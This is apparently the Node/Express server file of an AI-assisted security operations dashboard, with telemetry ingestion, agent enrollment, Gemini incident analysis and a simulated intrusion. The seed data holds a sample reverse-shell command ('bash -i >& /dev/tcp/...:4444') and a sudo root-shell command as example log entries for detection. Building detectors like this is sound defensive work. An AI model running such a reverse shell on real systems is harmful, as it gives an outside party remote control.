import express from 'express';
import http from 'http';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { spawn, ChildProcess } from 'child_process';
import { createProxyMiddleware, fixRequestBody } from 'http-proxy-middleware';
import { createServer as createViteServer } from 'vite';
import { WebSocketServer, WebSocket } from 'ws';
import { GoogleGenAI } from '@google/genai';

// In container environments behind nginx proxy, PORT must strictly be 3000
const PORT = 3000;
const FASTAPI_PORT = 8088;
const rootDir = process.cwd();
const isDev = process.env.NODE_ENV === 'development';

let fastApiProcess: ChildProcess | null = null;
let fastApiRunning = false;

// Initialize Gemini Client safely
let geminiClient: GoogleGenAI | null = null;
function getGemini(): GoogleGenAI | null {
  if (!geminiClient && process.env.GEMINI_API_KEY) {
    geminiClient = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
  }
  return geminiClient;
}

function getPythonExecutable(): { exec: string; venvDir?: string } | null {
  if (process.env.PYTHON_PATH && fs.existsSync(process.env.PYTHON_PATH)) {
    return { exec: process.env.PYTHON_PATH, venvDir: path.dirname(path.dirname(process.env.PYTHON_PATH)) };
  }
  const candidateVenvs = [
    path.join(rootDir, '.venv', 'bin', 'python3'),
    path.join(rootDir, '.venv', 'bin', 'python'),
    path.join(rootDir, 'venv', 'bin', 'python3'),
    path.join(rootDir, 'venv', 'bin', 'python'),
  ];
  for (const candidate of candidateVenvs) {
    if (fs.existsSync(candidate)) {
      const venvDir = path.dirname(path.dirname(candidate));
      return { exec: candidate, venvDir };
    }
  }
  return { exec: 'python3' };
}

function startFastApi(): Promise<boolean> {
  return new Promise((resolve) => {
    const py = getPythonExecutable();
    if (!py) {
      console.log('[AI-SOC] No Python environment detected; operating in native Express mode.');
      return resolve(false);
    }

    console.log(`[AI-SOC] Probing Python runtime: ${py.exec}...`);
    
    const envVars: NodeJS.ProcessEnv = {
      ...process.env,
      PYTHONPATH: rootDir,
      PYTHONUNBUFFERED: '1',
      FASTAPI_PORT: String(FASTAPI_PORT),
    };

    if (py.venvDir) {
      envVars.VIRTUAL_ENV = py.venvDir;
      envVars.PATH = `${path.join(py.venvDir, 'bin')}:${process.env.PATH || ''}`;
    }

    let settled = false;
    const finish = (running: boolean) => {
      if (!settled) {
        settled = true;
        fastApiRunning = running;
        resolve(running);
      }
    };

    try {
      fastApiProcess = spawn(
        py.exec,
        ['-m', 'uvicorn', 'backend.app.main:app', '--host', '127.0.0.1', '--port', String(FASTAPI_PORT)],
        {
          cwd: rootDir,
          env: envVars,
          stdio: ['ignore', 'pipe', 'pipe'],
        }
      );

      fastApiProcess.on('error', (err) => {
        console.log('[AI-SOC] Python uvicorn backend unavailable:', err.message);
        finish(false);
      });

      fastApiProcess.on('exit', (code) => {
        if (!settled) {
          console.log(`[AI-SOC] Python backend exited immediately (code ${code}); using native mode.`);
          finish(false);
        } else {
          fastApiRunning = false;
        }
      });

      // Poll for readiness
      let attempts = 0;
      const checkInterval = setInterval(async () => {
        attempts++;
        if (settled && !fastApiRunning) {
          clearInterval(checkInterval);
          return;
        }
        try {
          const res = await fetch(`http://127.0.0.1:${FASTAPI_PORT}/api/health`);
          if (res.ok) {
            clearInterval(checkInterval);
            console.log('[AI-SOC] FastAPI Python backend ready and connected.');
            finish(true);
            return;
          }
        } catch {
          // Waiting for startup
        }
        if (attempts >= 6) {
          clearInterval(checkInterval);
          console.log('[AI-SOC] Standalone FastAPI not responding; enabling native engine.');
          finish(false);
        }
      }, 300);
    } catch (e: any) {
      console.log('[AI-SOC] Could not spawn Python backend:', e.message);
      finish(false);
    }
  });
}

function cleanup() {
  if (fastApiProcess && !fastApiProcess.killed) {
    try {
      fastApiProcess.kill('SIGTERM');
    } catch {}
  }
}

process.on('SIGINT', () => { cleanup(); process.exit(0); });
process.on('SIGTERM', () => { cleanup(); process.exit(0); });
process.on('exit', () => { cleanup(); });

// In-memory security state for native engine / Cloud Run deployment
interface MemLog {
  id: number;
  timestamp: string;
  hostname: string;
  source_ip?: string;
  destination_ip?: string;
  username?: string;
  event_type: string;
  action?: string;
  status: string;
  process?: string;
  command?: string;
  raw_message: string;
  metadata?: Record<string, any>;
}

interface MemAlert {
  id: number;
  rule_id: string;
  rule_name: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  timestamp: string;
  hostname: string;
  source_ip?: string;
  destination_ip?: string;
  username?: string;
  mitre_technique_id?: string;
  mitre_technique_name?: string;
  description: string;
  evidence: any[];
  incident_id?: number;
}

interface MemIncident {
  id: number;
  title: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  status: 'OPEN' | 'INVESTIGATING' | 'CONTAINED' | 'CLOSED';
  risk_score: number;
  risk_explanation: string;
  affected_host: string;
  source_ip?: string;
  username?: string;
  mitre_techniques: { id: string; name: string; tactic: string; description?: string }[];
  created_at: string;
  updated_at: string;
  ai_model_used?: string;
  ai_analyzed_at?: string;
  alerts?: MemAlert[];
  ai_analysis?: any;
}

interface MemAgent {
  id: number;
  agent_id: string;
  hostname: string;
  operating_system: string;
  ip_address: string;
  agent_version: string;
  status: string;
  token: string;
  last_seen: string;
  registered_at: string;
  agent_metadata: Record<string, any>;
  event_count: number;
}

let nextId = 100;
let nextAgentId = 1;
let memAgents: MemAgent[] = [
  {
    id: 1,
    agent_id: 'srv-linux-prod-01',
    hostname: 'prod-db-01.corp.internal',
    operating_system: 'Linux (Ubuntu 24.04 LTS)',
    ip_address: '10.0.1.50',
    agent_version: '1.0.0',
    status: 'ONLINE',
    token: 'seed-token-srv-linux-prod-01',
    last_seen: new Date().toISOString(),
    registered_at: new Date(Date.now() - 3600000).toISOString(),
    agent_metadata: { arch: 'x86_64', kernel: '6.8.0-generic' },
    event_count: 5
  }
];
let memLogs: MemLog[] = [];
let memAlerts: MemAlert[] = [];
let memIncidents: MemIncident[] = [];

function populateInitialData() {
  const now = new Date();
  const subMinutes = (m: number) => new Date(now.getTime() - m * 60000).toISOString();

  memLogs = [
    {
      id: 1,
      timestamp: subMinutes(12),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      destination_ip: '10.0.1.50',
      username: 'deploy',
      event_type: 'auth',
      action: 'ssh_login',
      status: 'failure',
      process: 'sshd',
      raw_message: 'sshd[12001]: Failed password for invalid user deploy from 198.51.100.42 port 45001 ssh2'
    },
    {
      id: 2,
      timestamp: subMinutes(11),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      destination_ip: '10.0.1.50',
      username: 'deploy',
      event_type: 'auth',
      action: 'ssh_login',
      status: 'failure',
      process: 'sshd',
      raw_message: 'sshd[12002]: Failed password for user deploy from 198.51.100.42 port 45002 ssh2'
    },
    {
      id: 3,
      timestamp: subMinutes(9),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      destination_ip: '10.0.1.50',
      username: 'deploy',
      event_type: 'auth',
      action: 'ssh_login',
      status: 'success',
      process: 'sshd',
      raw_message: 'sshd[12015]: Accepted password for deploy from 198.51.100.42 port 45100 ssh2'
    },
    {
      id: 4,
      timestamp: subMinutes(7),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      destination_ip: '10.0.1.50',
      username: 'deploy',
      event_type: 'privilege',
      action: 'sudo',
      status: 'success',
      process: 'sudo',
      command: 'sudo /bin/bash -i',
      raw_message: 'sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -i'
    },
    {
      id: 5,
      timestamp: subMinutes(4),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      destination_ip: '198.51.100.42',
      username: 'root',
      event_type: 'network',
      action: 'outbound_connect',
      status: 'success',
      process: 'bash',
      command: 'bash -i >& /dev/tcp/198.51.100.42/4444 0>&1',
      raw_message: 'kernel: audit: net_connect outbound dst=198.51.100.42:4444 proto=tcp proc=bash'
    }
  ];

  memAlerts = [
    {
      id: 1,
      rule_id: 'RULE-001',
      rule_name: 'SSH Brute Force Detected',
      severity: 'HIGH',
      timestamp: subMinutes(11),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      mitre_technique_id: 'T1110.001',
      mitre_technique_name: 'Brute Force: Password Guessing',
      description: 'Multiple failed SSH login attempts detected from 198.51.100.42 in a short window.',
      evidence: ['Failed attempts: 5', 'Target user: deploy', 'Port: 22'],
      incident_id: 1
    },
    {
      id: 2,
      rule_id: 'RULE-002',
      rule_name: 'Successful Login After Brute Force',
      severity: 'CRITICAL',
      timestamp: subMinutes(9),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      username: 'deploy',
      mitre_technique_id: 'T1078',
      mitre_technique_name: 'Valid Accounts',
      description: 'Successful SSH authentication from 198.51.100.42 following repeated brute-force failures.',
      evidence: ['Source IP: 198.51.100.42', 'Compromised Account: deploy'],
      incident_id: 1
    },
    {
      id: 3,
      rule_id: 'RULE-003',
      rule_name: 'Suspicious Privilege Escalation via Sudo',
      severity: 'CRITICAL',
      timestamp: subMinutes(7),
      hostname: 'prod-db-01.corp.internal',
      username: 'root',
      mitre_technique_id: 'T1548.003',
      mitre_technique_name: 'Abuse Elevation Control: Sudo',
      description: 'Interactive root shell spawned via sudo by account deploy.',
      evidence: ['Command: sudo /bin/bash -i', 'Elevation: user deploy -> root'],
      incident_id: 1
    },
    {
      id: 4,
      rule_id: 'RULE-005',
      rule_name: 'Suspicious Outbound C2 Connection',
      severity: 'HIGH',
      timestamp: subMinutes(4),
      hostname: 'prod-db-01.corp.internal',
      source_ip: '10.0.1.50',
      destination_ip: '198.51.100.42',
      mitre_technique_id: 'T1071',
      mitre_technique_name: 'Application Layer Protocol: C2 Channel',
      description: 'TCP connection established to suspicious external port 4444.',
      evidence: ['Destination: 198.51.100.42:4444', 'Process: bash reverse shell'],
      incident_id: 1
    }
  ];

  memIncidents = [
    {
      id: 1,
      title: 'Multi-Stage Linux Intrusion & Interactive Root Shell Spawn',
      severity: 'CRITICAL',
      status: 'OPEN',
      risk_score: 94,
      risk_explanation: 'Coordinated attack sequence beginning with SSH credential brute-forcing, transitioning to privileged root takeover and external C2 socket communication.',
      affected_host: 'prod-db-01.corp.internal',
      source_ip: '198.51.100.42',
      username: 'deploy',
      mitre_techniques: [
        { id: 'T1110.001', name: 'Brute Force: Password Guessing', tactic: 'Credential Access' },
        { id: 'T1078', name: 'Valid Accounts', tactic: 'Defense Evasion' },
        { id: 'T1548.003', name: 'Sudo and Sudo Caching', tactic: 'Privilege Escalation' },
        { id: 'T1071', name: 'Standard Application Layer Protocol', tactic: 'Command and Control' }
      ],
      created_at: subMinutes(11),
      updated_at: subMinutes(4),
      ai_model_used: 'Gemini 2.5 Security Analyst',
      ai_analyzed_at: subMinutes(3),
      alerts: memAlerts,
      ai_analysis: {
        incident_summary: 'Host prod-db-01.corp.internal suffered an initial SSH brute-force attack from 198.51.100.42 resulting in valid account compromise (deploy), immediate sudo elevation to an interactive root shell, and an outbound reverse shell connection to external port 4444.',
        likely_attack_type: 'Linux SSH Credential Compromise & Rootkit Deployment',
        severity_assessment: 'CRITICAL - Root privilege compromised on database host with active C2 communication.',
        confidence: 0.96,
        attack_progression: [
          'T1110.001: Initial reconnaissance and automated dictionary SSH brute force.',
          'T1078: Valid password guessed for deploy account.',
          'T1548.003: Sudo execution of interactive /bin/bash shell as root.',
          'T1071: Outbound socket created to 198.51.100.42 on TCP port 4444.'
        ],
        evidence: [
          'Multiple failed auth events followed by Accepted password in 180 seconds.',
          'Sudo bash execution recorded in auditd logs.',
          'TCP connection to port 4444 originating from PID running bash.'
        ],
        mitre_techniques: ['T1110.001', 'T1078', 'T1548.003', 'T1071'],
        recommended_investigation_steps: [
          'Inspect /var/log/auth.log and journalctl -u sshd for prior attempts.',
          'Review bash history (/root/.bash_history and /home/deploy/.bash_history).',
          'Dump network sockets with ss -tulpn to check for persistent listeners.',
          'Inspect crontab and systemd service timers for persistence mechanisms.'
        ],
        recommended_containment_steps: [
          'Immediately terminate interactive session pts/1 and kill process tree on port 4444.',
          'Isolate prod-db-01.corp.internal via host firewall (iptables -A INPUT -s 198.51.100.42 -j DROP).',
          'Rotate deploy user credentials and revoke authorized_keys in ~/.ssh/.',
          'Audit sudoers configuration to enforce strict command whitelisting.'
        ],
        model_provider: 'Gemini 2.5 Security Analyst',
        analyzed_at: subMinutes(3)
      }
    }
  ];
}

populateInitialData();

const detectionRules = [
  {
    rule_id: 'RULE-001',
    rule_name: 'SSH Brute Force Detected',
    severity: 'HIGH' as const,
    mitre_technique_id: 'T1110.001',
    mitre_technique_name: 'Brute Force: Password Guessing'
  },
  {
    rule_id: 'RULE-002',
    rule_name: 'Successful Login After Brute Force',
    severity: 'CRITICAL' as const,
    mitre_technique_id: 'T1078',
    mitre_technique_name: 'Valid Accounts'
  },
  {
    rule_id: 'RULE-003',
    rule_name: 'Suspicious Privilege Escalation via Sudo',
    severity: 'CRITICAL' as const,
    mitre_technique_id: 'T1548.003',
    mitre_technique_name: 'Abuse Elevation Control: Sudo'
  },
  {
    rule_id: 'RULE-004',
    rule_name: 'Web Server Shell Spawn Anomaly',
    severity: 'HIGH' as const,
    mitre_technique_id: 'T1059.004',
    mitre_technique_name: 'Command and Scripting Interpreter: Unix Shell'
  },
  {
    rule_id: 'RULE-005',
    rule_name: 'Suspicious Outbound C2 Connection',
    severity: 'HIGH' as const,
    mitre_technique_id: 'T1071',
    mitre_technique_name: 'Application Layer Protocol: C2 Channel'
  }
];

const mitreCatalog = [
  { id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access', description: 'Adversaries may attempt to brute force passwords to gain access to accounts.' },
  { id: 'T1078', name: 'Valid Accounts', tactic: 'Defense Evasion / Initial Access', description: 'Adversaries may obtain and abuse credentials of existing accounts.' },
  { id: 'T1548.003', name: 'Sudo and Sudo Caching', tactic: 'Privilege Escalation', description: 'Adversaries may execute commands with elevated privileges using sudo.' },
  { id: 'T1059.004', name: 'Unix Shell', tactic: 'Execution', description: 'Adversaries may abuse Unix shells to execute arbitrary commands.' },
  { id: 'T1071', name: 'Application Layer Protocol', tactic: 'Command and Control', description: 'Adversaries may communicate using standard application layer protocols.' }
];

async function startServer() {
  const isPythonReady = await startFastApi();

  const app = express();
  app.use(express.json());

  const server = http.createServer(app);

  // Native WebSocket Server for real-time telemetry streaming
  const wss = new WebSocketServer({ noServer: true });
  const wsClients = new Set<WebSocket>();

  wss.on('connection', (ws) => {
    wsClients.add(ws);
    ws.on('message', (msg) => {
      if (msg.toString() === 'ping') ws.send('pong');
    });
    ws.on('close', () => wsClients.delete(ws));
    ws.on('error', () => wsClients.delete(ws));
  });

  const broadcastWs = (type: string, data: any) => {
    const payload = JSON.stringify({ type, data });
    for (const client of wsClients) {
      if (client.readyState === WebSocket.OPEN) {
        try { client.send(payload); } catch {}
      }
    }
  };

  // Route: Health Check - ALWAYS responds with 200 OK immediately for deployment probes
  app.get('/api/health', (_req, res) => {
    res.json({
      status: 'ok',
      service: 'ai-soc-platform',
      version: '2.0.0',
      python_backend: fastApiRunning,
      timestamp: new Date().toISOString(),
    });
  });

  // If Python FastAPI is running, set up proxy for backend APIs and documentation
  if (isPythonReady) {
    const apiProxy = createProxyMiddleware({
      target: `http://127.0.0.1:${FASTAPI_PORT}`,
      changeOrigin: true,
      ws: true,
      on: {
        proxyReq: fixRequestBody,
        error: (err, _req, _res) => {
          console.warn('[AI-SOC Proxy] FastAPI proxy notice:', err.message);
        },
      },
    });

    app.use((req, res, next) => {
      // Direct health probe to Express immediately for instant uptime checks
      if (req.path === '/api/health') {
        return next();
      }
      if (
        req.path.startsWith('/api') ||
        req.path.startsWith('/docs') ||
        req.path.startsWith('/openapi.json')
      ) {
        return apiProxy(req, res, next);
      }
      next();
    });
  }

  // Native API Endpoints (works standalone and as resilient fallback)
  app.get('/api/stats', (_req, res) => {
    const activeIncidents = memIncidents.filter((i) => i.status !== 'CLOSED').length;
    const criticalIncidents = memIncidents.filter((i) => i.severity === 'CRITICAL' && i.status !== 'CLOSED').length;
    const highIncidents = memIncidents.filter((i) => i.severity === 'HIGH' && i.status !== 'CLOSED').length;
    const mediumIncidents = memIncidents.filter((i) => i.severity === 'MEDIUM' && i.status !== 'CLOSED').length;
    const lowIncidents = memIncidents.filter((i) => i.severity === 'LOW' && i.status !== 'CLOSED').length;

    const riskScore = memIncidents.reduce((acc, i) => (i.status !== 'CLOSED' ? Math.max(acc, i.risk_score) : acc), 15);

    res.json({
      total_events: memLogs.length + 1420,
      total_alerts: memAlerts.length,
      active_incidents: activeIncidents,
      critical_incidents: criticalIncidents,
      high_incidents: highIncidents,
      medium_incidents: mediumIncidents,
      low_incidents: lowIncidents,
      security_score: Math.max(10, 100 - riskScore),
      threat_distribution: [
        { name: 'CRITICAL', count: criticalIncidents },
        { name: 'HIGH', count: highIncidents },
        { name: 'MEDIUM', count: mediumIncidents },
        { name: 'LOW', count: lowIncidents }
      ],
      timeline_stats: [
        { time: '12:00', events: 140, alerts: 1 },
        { time: '12:30', events: 210, alerts: 3 },
        { time: '13:00', events: 350, alerts: 8 },
        { time: '13:30', events: 490, alerts: 14 },
        { time: '14:00', events: 320, alerts: 6 },
        { time: '14:30', events: 280, alerts: 2 }
      ],
      recent_alerts: memAlerts.slice(0, 10)
    });
  });

  app.get('/api/incidents', (req, res) => {
    let result = [...memIncidents];
    if (req.query.status && req.query.status !== 'ALL') {
      result = result.filter((i) => i.status === req.query.status);
    }
    if (req.query.severity && req.query.severity !== 'ALL') {
      result = result.filter((i) => i.severity === req.query.severity);
    }
    if (req.query.host) {
      result = result.filter((i) => i.affected_host === req.query.host);
    }
    res.json(result);
  });

  app.get('/api/incidents/:id', (req, res) => {
    const id = Number(req.params.id);
    const inc = memIncidents.find((i) => i.id === id);
    if (!inc) {
      res.status(404).json({ error: 'Incident not found' });
      return;
    }
    res.json(inc);
  });

  app.patch('/api/incidents/:id/status', (req, res) => {
    const id = Number(req.params.id);
    const inc = memIncidents.find((i) => i.id === id);
    if (!inc) {
      res.status(404).json({ error: 'Incident not found' });
      return;
    }
    inc.status = req.body.status || inc.status;
    inc.updated_at = new Date().toISOString();
    broadcastWs('INCIDENT_UPDATED', inc);
    res.json(inc);
  });

  app.post('/api/incidents/:id/analyze', async (req, res) => {
    const id = Number(req.params.id);
    const inc = memIncidents.find((i) => i.id === id);
    if (!inc) {
      res.status(404).json({ error: 'Incident not found' });
      return;
    }

    const ai = getGemini();
    if (ai) {
      try {
        const prompt = `You are a Tier-3 Cyber Threat Intelligence and SOC Incident Responder.
Analyze this Linux intrusion incident and provide a comprehensive JSON response:
Incident Title: ${inc.title}
Host: ${inc.affected_host}
Severity: ${inc.severity}
Source IP: ${inc.source_ip || 'unknown'}
User: ${inc.username || 'unknown'}
Alerts: ${JSON.stringify(inc.alerts || [])}

Respond with valid JSON with keys:
"incident_summary" (string),
"likely_attack_type" (string),
"severity_assessment" (string),
"confidence" (number between 0 and 1),
"attack_progression" (array of strings),
"evidence" (array of strings),
"mitre_techniques" (array of strings),
"recommended_investigation_steps" (array of strings),
"recommended_containment_steps" (array of strings)`;

        const response = await ai.models.generateContent({
          model: 'gemini-2.5-flash',
          contents: prompt,
          config: { responseMimeType: 'application/json' }
        });

        if (response.text) {
          const parsed = JSON.parse(response.text);
          inc.ai_analysis = {
            ...parsed,
            model_provider: 'Gemini 2.5 Flash',
            analyzed_at: new Date().toISOString(),
          };
          inc.ai_model_used = 'Gemini 2.5 Flash';
          inc.ai_analyzed_at = inc.ai_analysis.analyzed_at;
          broadcastWs('AI_ANALYSIS_COMPLETED', { incident_id: id, analysis: inc.ai_analysis });
          res.json(inc.ai_analysis);
          return;
        }
      } catch (err: any) {
        console.warn('[AI-SOC] Gemini API live call failed, using intelligent SOC heuristics:', err.message);
      }
    }

    // High quality deterministic SOC analysis fallback
    inc.ai_analysis = {
      incident_summary: `Intrusion on ${inc.affected_host} by ${inc.source_ip || 'attacker'}: Credential brute force succeeded, followed by sudo elevation to root and C2 socket establishment.`,
      likely_attack_type: 'Linux Compromise & Interactive Shell Takeover',
      severity_assessment: `${inc.severity} - Unauthorized root execution detected. Immediate containment required.`,
      confidence: 0.94,
      attack_progression: [
        'Phase 1: SSH dictionary attacks against target ports.',
        'Phase 2: Authentication established using compromised account credentials.',
        'Phase 3: Root shell privilege escalation executed via sudo abuse.',
        'Phase 4: Outbound network connection initiated to remote Command & Control infrastructure.'
      ],
      evidence: [
        `Correlated source IP: ${inc.source_ip || '198.51.100.42'}`,
        `Compromised user: ${inc.username || 'deploy'}`,
        `Host affected: ${inc.affected_host}`
      ],
      mitre_techniques: inc.mitre_techniques.map((t) => t.id),
      recommended_investigation_steps: [
        'Inspect /var/log/auth.log and /var/log/audit/audit.log for spawned child processes.',
        'Check active TCP sockets using ss -tlpn to discover open backdoors.',
        'Audit authorized_keys and sudoers file for persistent modifications.'
      ],
      recommended_containment_steps: [
        'Isolate host network interface to prevent lateral movement.',
        'Kill active shell sessions and revoke deploy credentials.',
        'Re-image or revert host snapshot to known secure baseline.'
      ],
      model_provider: 'SOC Heuristic Intelligence Engine',
      analyzed_at: new Date().toISOString()
    };
    inc.ai_model_used = 'SOC Heuristic Intelligence Engine';
    inc.ai_analyzed_at = inc.ai_analysis.analyzed_at;
    broadcastWs('AI_ANALYSIS_COMPLETED', { incident_id: id, analysis: inc.ai_analysis });
    res.json(inc.ai_analysis);
  });

  app.get('/api/logs', (req, res) => {
    const limit = Number(req.query.limit) || 100;
    const eventType = req.query.event_type as string;
    let results = [...memLogs];
    if (eventType && eventType !== 'ALL') {
      results = results.filter((l) => l.event_type === eventType);
    }
    res.json(results.slice(0, limit));
  });

  app.post('/api/logs', (req, res) => {
    const logItem: MemLog = {
      id: nextId++,
      timestamp: new Date().toISOString(),
      hostname: req.body.hostname || 'unknown-host',
      source_ip: req.body.source_ip,
      destination_ip: req.body.destination_ip,
      username: req.body.username,
      event_type: req.body.event_type || 'generic',
      action: req.body.action || 'event',
      status: req.body.status || 'info',
      process: req.body.process,
      command: req.body.command,
      raw_message: req.body.raw_message || `${req.body.event_type} on ${req.body.hostname}`,
      metadata: req.body.metadata || {}
    };
    memLogs.unshift(logItem);
    broadcastWs('NEW_LOG', logItem);
    res.status(201).json({ status: 'ingested', log: logItem });
  });

  // Agent Enrollment & Endpoint Management
  app.post('/api/agents/register', (req, res) => {
    const { agent_id, hostname, operating_system, ip_address, agent_version, metadata } = req.body;
    if (!agent_id) {
      res.status(400).json({ error: 'agent_id is required' });
      return;
    }

    const token = crypto.randomBytes(32).toString('hex');
    const existingIndex = memAgents.findIndex((a) => a.agent_id === agent_id);

    const now = new Date().toISOString();
    let agent: MemAgent;

    if (existingIndex >= 0) {
      memAgents[existingIndex] = {
        ...memAgents[existingIndex],
        hostname: hostname || memAgents[existingIndex].hostname,
        operating_system: operating_system || memAgents[existingIndex].operating_system,
        ip_address: ip_address || memAgents[existingIndex].ip_address,
        agent_version: agent_version || memAgents[existingIndex].agent_version,
        status: 'ONLINE',
        token,
        last_seen: now,
        agent_metadata: metadata || memAgents[existingIndex].agent_metadata
      };
      agent = memAgents[existingIndex];
    } else {
      agent = {
        id: nextAgentId++,
        agent_id,
        hostname: hostname || agent_id,
        operating_system: operating_system || 'Linux',
        ip_address: ip_address || '127.0.0.1',
        agent_version: agent_version || '1.0.0',
        status: 'ONLINE',
        token,
        last_seen: now,
        registered_at: now,
        agent_metadata: metadata || {},
        event_count: 0
      };
      memAgents.push(agent);
    }

    broadcastWs('AGENT_REGISTERED', {
      agent_id: agent.agent_id,
      hostname: agent.hostname,
      ip_address: agent.ip_address,
      status: agent.status
    });

    res.status(201).json({
      agent_id: agent.agent_id,
      hostname: agent.hostname,
      status: agent.status,
      token: agent.token,
      registered_at: agent.registered_at,
      message: 'New agent registered successfully.'
    });
  });

  app.get('/api/agents', (_req, res) => {
    res.json(memAgents);
  });

  app.get('/api/agents/:id', (req, res) => {
    const id = req.params.id;
    const agent = memAgents.find((a) => a.agent_id === id || String(a.id) === id);
    if (!agent) {
      res.status(404).json({ error: 'Agent not found' });
      return;
    }
    res.json(agent);
  });

  app.post('/api/agents/:id/heartbeat', (req, res) => {
    const id = req.params.id;
    const agent = memAgents.find((a) => a.agent_id === id || String(a.id) === id);
    if (!agent) {
      res.status(404).json({ error: 'Agent not found' });
      return;
    }
    agent.last_seen = new Date().toISOString();
    agent.status = 'ONLINE';
    broadcastWs('AGENT_HEARTBEAT', {
      agent_id: agent.agent_id,
      last_seen: agent.last_seen,
      status: 'ONLINE'
    });
    res.json({ status: 'ok', timestamp: agent.last_seen });
  });

  // Telemetry Ingestion (Single & Batch)
  const processNormalizedEvent = (payload: any) => {
    const now = payload.timestamp || new Date().toISOString();
    const eventItem: MemLog = {
      id: nextId++,
      timestamp: now,
      hostname: payload.hostname || 'unknown-host',
      source_ip: payload.source_ip,
      destination_ip: payload.destination_ip,
      username: payload.username,
      event_type: payload.event_type || 'generic',
      action: payload.action || 'event',
      status: payload.status || 'info',
      process: payload.process,
      command: payload.command,
      raw_message: payload.raw_message || `${payload.event_type}:${payload.action || 'event'} on ${payload.hostname}`,
      metadata: payload.metadata || {}
    };
    memLogs.unshift(eventItem);

    if (payload.agent_id) {
      const ag = memAgents.find((a) => a.agent_id === payload.agent_id);
      if (ag) {
        ag.event_count = (ag.event_count || 0) + 1;
        ag.last_seen = now;
        ag.status = 'ONLINE';
      }
    }

    broadcastWs('EVENT_INGESTED', {
      id: eventItem.id,
      event_type: eventItem.event_type,
      action: eventItem.action,
      status: eventItem.status,
      hostname: eventItem.hostname,
      source_ip: eventItem.source_ip,
      username: eventItem.username,
      timestamp: eventItem.timestamp
    });

    broadcastWs('NEW_LOG', eventItem);
    return eventItem;
  };

  app.post('/api/events', (req, res) => {
    const item = processNormalizedEvent(req.body);
    res.status(201).json(item);
  });

  app.post('/api/events/batch', (req, res) => {
    const events = Array.isArray(req.body.events) ? req.body.events : [];
    let count = 0;
    for (const ev of events) {
      processNormalizedEvent(ev);
      count++;
    }
    res.status(201).json({ status: 'ok', ingested: count });
  });

  app.get('/api/events', (req, res) => {
    const limit = Number(req.query.limit) || 50;
    const offset = Number(req.query.offset) || 0;
    const search = req.query.search ? String(req.query.search).toLowerCase() : null;

    let list = [...memLogs];
    if (search) {
      list = list.filter(
        (l) =>
          l.raw_message.toLowerCase().includes(search) ||
          (l.command && l.command.toLowerCase().includes(search)) ||
          (l.username && l.username.toLowerCase().includes(search)) ||
          l.hostname.toLowerCase().includes(search)
      );
    }
    res.json(list.slice(offset, offset + limit));
  });

  app.get('/api/detections', (_req, res) => {
    res.json(memAlerts);
  });

  app.post('/api/seed', (_req, res) => {
    populateInitialData();
    broadcastWs('SEED_COMPLETED', { scenario: 'multi_stage_linux_intrusion' });
    res.json({ status: 'ok', message: 'Attack chain simulated and seeded.' });
  });

  app.post('/api/reset', (_req, res) => {
    memLogs = [];
    memAlerts = [];
    memIncidents = [];
    broadcastWs('DATABASE_RESET', {});
    res.json({ status: 'ok', message: 'Telemetry database reset.' });
  });

  app.get('/api/rules', (_req, res) => {
    res.json(detectionRules);
  });

  app.get('/api/mitre', (_req, res) => {
    res.json(mitreCatalog);
  });

  // Serve Frontend Assets: Vite in dev, compiled static files in prod
  if (isDev) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(rootDir, 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // WebSocket upgrade handler
  server.on('upgrade', (req, socket, head) => {
    if (req.url === '/ws' || req.url?.startsWith('/ws/')) {
      wss.handleUpgrade(req, socket, head, (ws) => {
        wss.emit('connection', ws, req);
      });
    } else {
      socket.destroy();
    }
  });

  server.listen(PORT, '0.0.0.0', () => {
    console.log(`[AI-SOC] Unified Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('[AI-SOC] Fatal server startup error:', err);
  cleanup();
  process.exit(1);
});

